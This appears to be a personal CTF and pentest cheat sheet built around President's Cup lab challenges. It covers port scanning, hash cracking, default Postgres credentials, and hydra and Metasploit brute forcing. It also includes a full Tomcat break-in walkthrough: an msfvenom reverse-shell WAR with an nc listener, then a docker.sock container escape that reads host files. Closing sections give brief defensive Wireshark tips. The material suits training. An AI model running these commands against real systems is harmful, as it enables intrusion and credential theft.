# Notes

LLMs to help:
- [ChatGPT](https://chatgpt.com/)
- [Claude](https://claude.ai/) (requires sign-in)
- [DeepSeek](https://chat.deepseek.com/) (requires sign-in)
- [DuckDuckGo](https://duck.ai)
- Brave LEO `brave://leo-ai/`

## Scanning

If nmap isn't available you can use netcat to scan:
```
# lower ports
nc -w 1 -zv x.x.x.x 1-1023 > ncscan.txt 2>&1
grep -v refused ncscan.txt

# or for all the ports
nc -w 1 -zv x.x.x.x 1-65535 > ncscan.txt 2>&1
```

## Crack a password hash

Use john-the-ripper (`john`), passing a wordlist as a txt and the hashing algorithm, then the file containing the hash. 

Given an MD5 hash, store it in a file `hash.txt`, then
```
hashcat -a 0 -m 0 ./hash.txt /usr/share/wordlists/rockyou.txt 
# attack mode^  ^hash type

- [ Attack Modes ] -
  # | Mode
 ===+======
  0 | Straight
  1 | Combination
  3 | Brute-force
  6 | Hybrid Wordlist + Mask
  7 | Hybrid Mask + Wordlist
  9 | Association

# for all hash type options, do `hashcat -hh`
```

### Crack a postgres password

Given: you know the username and the IP of the postgres server, you can try default credentials:
```
postgres:postgres
postgres:<blank>
postgres:password
postgres:admin
admin:admin
```

or brute force with hydra:
```bash
hydra -l postgres -P /usr/share/wordlists/rockyou.txt target.com postgres
#       ^username ^password file                      ^ip or host ^service
```

or with patator:
```bash
patator psql_login host=10.1.1.210 user=postgres password=FILE0 0=/home/user/Desktop/wordlist.txt -x ignore:fgrep='
```

or potentially Metasploit, although it did not give me a straightforward answer
```
msf > search postgres
msf > use auxiliary/scanner/postgres/postgres_login
msf > set verbose False
msf > run postgres://known_user@10.1.1.210 threads=50 pass_file=./wordlist.txt
```

## Connecting

When SSH is filtered and you don't have a route directly from your box to the target, but you can go through an intermediate one, create a netcat relay to pivot.

## Common Exploits

If FTP (port 21) is open, use Filezilla to get a file.

Cracking a remote service password (ssh, smb, redis, rdp, postgres, sql, ftp, etc.) given a username and password list: use xHydra.

### Breaking into a web server
ref: [pc6/indv-b/let-loose-the-logs-of-war](https://github.com/cisagov/prescup-challenges/tree/main/pc6-round1/individual-b/let-loose-the-logs-of-war/solution) with docker API commands via docker unix socket

1. enumerate to see what's available
```bash
nmap -sV 10.5.5.100
```
2. If, say, 8080/tcp is http, visit it, but you can also do dirbuster (i.e. if page not found)
```bash
dirb http://10.5.5.100
```
3. a directory /manager is found, visit it, it asks for user/pass authentication. Use hydra
```bash
hydra -s 8080 -l admin -P /home/user/Desktop/wordlist.txt 10.5.5.100 http-get /manager/html -m "/manager/html" -t 4
#     ^ssl ^port ^user   ^password list                              ^module  ^redir path    ^option?          ^tasks
```
4. Manager can deploy WAR files. Generate reverse shell with msfvenom:
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.5.5.60 LPORT=9999 -f war > shell.war
```
upload that .war, listen on your box for incoming:
```bash
nc -klvp 9999
```
and you'll get a shell
5. Check if docker socket is mounted
```sh
ls /var/run/docker.sock
```
if so, list images
```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json | awk '{gsub(/},\s*{/, "}\n{\n"); gsub(/^\[\s*/, "[\n"); gsub(/\s*\]$/, "\n]"); gsub(/,\s*$/, "\n"); print}'
```
6. Create a container that `ls`s the target directory
```bash
curl --unix-socket /var/run/docker.sock -X POST -H "Content-Type: application/json" \
   -d '{
     "Image": "tomcat:latest",
     "Cmd": ["/bin/sh", "-c", "ls /host/home/user/"],
     "HostConfig": {
       "Binds": ["/:/host"]
     }
   }' http://localhost/containers/create
```
it outputs a container id
7. Start that image to run the command
```bash
curl --unix-socket /var/run/docker.sock -X POST http://localhost/containers/02a5d7e0420b83ae2699a91c91d726c0b96ca01eee2178f25edd2d382deeb6d9/start
```
and then look at its output
```bash
curl --unix-socket /var/run/docker.sock "http://localhost/containers/02a5d7e0420b83ae2699a91c91d726c0b96ca01eee2178f25edd2d382deeb6d9/logs?stdout=true"
```
8. Create a container to `cat` the file
```bash
curl --unix-socket /var/run/docker.sock -X POST -H "Content-Type: application/json" \
   -d '{
     "Image": "tomcat:latest",
     "Cmd": ["/bin/sh", "-c", "cat /host/home/user/TOKEN2.txt"],
     "HostConfig": {
       "Binds": ["/:/host"]
     }
   }' http://localhost/containers/create
```
9. Run that container
```bash
curl --unix-socket /var/run/docker.sock -X POST http://localhost/containers/79a958f168f93915c884a2161bd1d8830506ba689f5f91fd93d2007ae53c5f21/start
```
and then look at its output
```bash
curl --unix-socket /var/run/docker.sock "http://localhost/containers/79a958f168f93915c884a2161bd1d8830506ba689f5f91fd93d2007ae53c5f21/logs?stdout=true"
```


## Priv escalation

Standard practice is to check for vulnerable versions of sudo, and list sudo permissions for a user
```bash
sudo -V

sudo -l
```

## Reverse engineering / binary analysis

To analyze a binary to find a list of dynamically-linked symbols, use
```bash
nm -D mybinary
```

To run the GNU debugger: 
```bash
chmod +x mybinary
gdb ./mybinary
```
Then add a breakpoint at the function identified from `nm` (because `AES_ige_encrypt` is the only thing having to do with the question, about encryption)
```
(gdb) b AES_ige_encrypt
# answer yes to the prompt

# then run the program
(gdb) r

# print registers
(gdb) info r

# examine a buffer at a location (in this case, `rsi` leads to `0x5555555bc7e0`)
(gdb) x/32bc 0x5555555bc7e0

# run the program until the next return occurs
(gdb) fin
```

## Capturing / acquiring volatile memory
memdump

* Windows: WinPmem, FTK Imager
* macOS: osxpmem
* Linux: [AVML](https://github.com/microsoft/avml)

_Then_ you can use [Volatility3](https://volatility3.readthedocs.io/en/stable/).

# Defense

## How to spot a SQL injection

Collect a pcap during the time you think the injection took place, open it in Wireshark, and search the **packet details** for a **string** that matches common SQL injection patterns, such as `1=1`. Now you have the IP of the attacker. 

## Find a brute force attacker

In Wireshark looking at packets sent to your web server (`ip.dst == x.x.x.x`), look for multiple hits on the login page per second, in rapid succession. That's your attacker. 

## Identify what was exfiltrated from a website

In wireshark, go to File > Export Objects > HTTP and choose the content type (in this case we were **told** it was a sql database, so choose `application/x-sqlite3`). You can download the file from there. 

# Misc

## Postgres

psql command line
```
\l              # list databases
\c GameAPI      # change database (i.e. `use GameAPI`)
\dt *           # list tables

# Wrap table names in quotes, because it will try to lowercase them
select * from public."Users";
```

## The format of an API call

```bash
curl -X 'GET' \
    'http://10.1.1.210/api/game/Endpoint' \
    -H 'UserAuthToken: $mytoken \
    -H 'accept: */*'
```

# Volatility
